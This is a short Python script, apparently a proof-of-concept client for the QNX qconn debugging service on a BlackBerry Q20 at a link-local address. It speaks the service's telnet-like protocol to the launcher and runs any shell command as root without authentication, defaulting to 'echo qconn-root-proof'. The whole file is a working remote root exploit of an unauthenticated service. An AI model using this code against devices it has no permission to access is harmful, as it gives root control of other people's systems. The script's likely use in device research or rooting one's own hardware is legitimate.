#!/usr/bin/env python3
"""Minimal qconn client for the Q20 (port 8000): run commands as root.

Derived from the qnx8-qconn-mcp protocol reference (telnet-ish framing,
broker -> launcher service, start/flags run). No auth: dev-mode qconn
executes as root.
"""
import socket, sys, time

IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240

def read_until_prompt(sock, timeout=10.0, buf=b""):
    sock.settimeout(timeout)
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            return buf, True
        if not chunk:
            return buf, False
        # handle telnet negotiation inline
        out = b""
        i = 0
        while i < len(chunk):
            b = chunk[i]
            if b == IAC:
                if i + 1 >= len(chunk):
                    break
                c = chunk[i+1]
                if c in (DO, DONT):
                    sock.sendall(bytes([IAC, WONT, chunk[i+2]])) if i+2 < len(chunk) else None
                    i += 3
                elif c in (WILL, WONT):
                    sock.sendall(bytes([IAC, DONT, chunk[i+2]])) if i+2 < len(chunk) else None
                    i += 3
                elif c == SB:
                    j = chunk.find(bytes([IAC, SE]), i)
                    if j < 0:
                        break
                    i = j + 2
                else:
                    i += 2
            else:
                out += bytes([b])
                i += 1
        buf += out
        if b"<qconn-broker>" in buf or b"<qconn-launcher>" in buf:
            return buf, True

def exec_cmd(cmd, timeout=60.0):
    s = socket.create_connection(("169.254.0.1", 8000), timeout=10)
    buf, ok = read_until_prompt(s, 5.0)
    if not ok:
        s.close(); return "ERR no broker prompt: %r" % buf
    s.sendall(b"service launcher\n")
    buf2, ok = read_until_prompt(s, 5.0)
    if not ok:
        s.close(); return "ERR no launcher prompt: %r" % buf2
    line = 'start/flags run /bin/sh /bin/sh -c "%s"\n' % cmd.replace('\\', '\\\\').replace('"', '\\"')
    s.sendall(line.encode())
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out.decode(errors="replace")

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "echo qconn-root-proof"
    print(exec_cmd(cmd))
